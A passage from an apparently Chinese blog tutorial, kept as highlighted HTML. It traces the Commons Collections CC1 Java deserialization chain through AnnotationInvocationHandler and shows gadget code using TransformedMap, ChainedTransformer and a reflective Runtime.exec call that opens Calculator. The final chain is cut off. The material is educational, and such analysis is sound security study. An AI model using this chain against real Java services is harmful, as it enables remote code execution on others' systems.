class=\"token punctuation\">(</span><span class=\"token operator\">!</span>annotationClass<span class=\"token punctuation\">.</span><span class=\"token function\">isAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not an annotation type\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> methods <span class=\"token operator\">=</span>\n            <span class=\"token class-name\">AccessController</span><span class=\"token punctuation\">.</span><span class=\"token function\">doPrivileged</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">PrivilegedAction</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">public</span> <span class=\"token class-name\">Method</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token comment\">// Initialize memberTypes and defaultValues</span>\n                    <span class=\"token keyword\">return</span> annotationClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        memberTypes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>methods<span class=\"token punctuation\">.</span>length<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        memberDefaults <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        members <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Method</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>methods<span class=\"token punctuation\">.</span>length<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span> method <span class=\"token operator\">:</span>  methods<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span><span class=\"token function\">getParameterTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span>method <span class=\"token operator\">+</span> <span class=\"token string\">\" has params\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> type <span class=\"token operator\">=</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">getReturnType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            memberTypes<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> <span class=\"token function\">invocationHandlerReturnType</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            members<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">Object</span> defaultValue <span class=\"token operator\">=</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">getDefaultValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>defaultValue <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                memberDefaults<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> defaultValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看一下</p>\n<ul>\n<li>第6行：获取到annotation中的所有方法</li>\n<li>第22行：将方法名，方法的返回类型放入到memeberType中</li>\n<li>第23行：members里面放入的是方法名和方法</li>\n</ul>\n<h5 id=\"调用栈3：readObject（440行）–-gt-annotationType-memberTypes\"><a href=\"#调用栈3：readObject（440行）–-gt-annotationType-memberTypes\" class=\"headerlink\" title=\"调用栈3：readObject（440行）–&gt; annotationType.memberTypes\"></a>调用栈3：readObject（440行）–&gt; annotationType.memberTypes</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> <span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> memberTypes<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"readObject的遍历\"><a href=\"#readObject的遍历\" class=\"headerlink\" title=\"readObject的遍历\"></a>readObject的遍历</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValue <span class=\"token operator\">:</span> memberValues<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> memberType <span class=\"token operator\">=</span> memberTypes<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>memberType <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// i.e. member still exists</span>\n        <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>memberType<span class=\"token punctuation\">.</span><span class=\"token function\">isInstance</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\n              value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ExceptionProxy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>\n                <span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span>\n                    value<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"[\"</span> <span class=\"token operator\">+</span> value <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span>\n                        annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里将membervalue进行遍历，其实就是将我们传入的map进行遍历。</p>\n<ul>\n<li>第五行：拿我们传入的map的key值去匹配，，看是否可以获取到value，这里membertypes中传入的是annotation&lt;方法名,返回类型&gt;，所以这里要满足的条件是，传入的map中的key是annotation的方法名</li>\n<li>第6行：进入到if中进行判断，这里判断了annotation的返回值不是对象也不是继承 <code>ExceptionProxy</code></li>\n<li>而它setvalue的对象是</li>\n</ul>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span>\n                            value<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"[\"</span> <span class=\"token operator\">+</span> value <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span>\n                                annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里跟进发现其实就是调用了getname方法，然后返回值。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ExceptionProxy</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">long</span> serialVersionUID <span class=\"token operator\">=</span> <span class=\"token number\">7844069490309503934L</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Method</span> member<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> foundType<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * It turns out to be convenient to construct these proxies in\n     * two stages.  Since this is a private implementation class, we\n     * permit ourselves this liberty even though it's normally a very\n     * bad idea.\n     */</span>\n    <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> foundType<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>foundType <span class=\"token operator\">=</span> foundType<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span> <span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span> member<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>member <span class=\"token operator\">=</span> member<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里看到返回值，其实返回的就是一个方法，有两种情况</p>\n<ul>\n<li>方法返回值为恶意对象（不现实）</li>\n<li>在setvalue的时候，其实调用的是value.transform，这里看了一下作者的代码，发现是利用了value.transform来进行的链式调用。</li>\n</ul>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">cmd cmd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> objectObjectHashMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nobjectObjectHashMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">InvokerTransformer</span> <span class=\"token class-name\">Invoker</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"StringA\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"hello world!\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"StringA\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"hello world!\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> declaredConstructor <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> decorate <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>objectObjectHashMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndeclaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Target</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> decorate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Main<span class=\"token punctuation\">.</span>Serialize</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Main<span class=\"token punctuation\">.</span>UnSerialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h4 id=\"Runtime-class的反序列化问题\"><a href=\"#Runtime-class的反序列化问题\" class=\"headerlink\" title=\"Runtime.class的反序列化问题\"></a>Runtime.class的反序列化问题</h4><p>Runtime不能序列化，但是<code>Class</code>是可以进行序列化的，所以这里咱们就可以从Class原形来进行入手。按照InvocationTransformer那种格式来进行编写。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230830221049301.png\" alt=\"image-20230830221049301\"></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span> getMethod <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span> getRuntime <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span><span class=\"token punctuation\">)</span> getMethod<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        第二轮</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Method</span><span class=\"token punctuation\">></span></span> a <span class=\"token operator\">=</span> getRuntime<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span> invoke <span class=\"token operator\">=</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Runtime</span> invoke1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">)</span> invoke<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>getRuntime<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        第三轮</span>\n        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">></span></span> aClass1 <span class=\"token operator\">=</span> invoke1<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span> exec <span class=\"token operator\">=</span> aClass1<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        exec<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>invoke1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"open -a Calculator\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"最后链子\"><a href=\"#最后链子\" class=\"headerlink\" title=\"最后链子\"></a>最后链子</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">Serialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">FileOutputStream</span> fileOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bin.ser\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ObjectOutputStream</span> objectOutputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>fileOutputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fileOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        objectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">UnSerialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">FileInputStream</span> fileInputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bin.ser\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ObjectInputStream</span> objectInputStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>fileInputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> 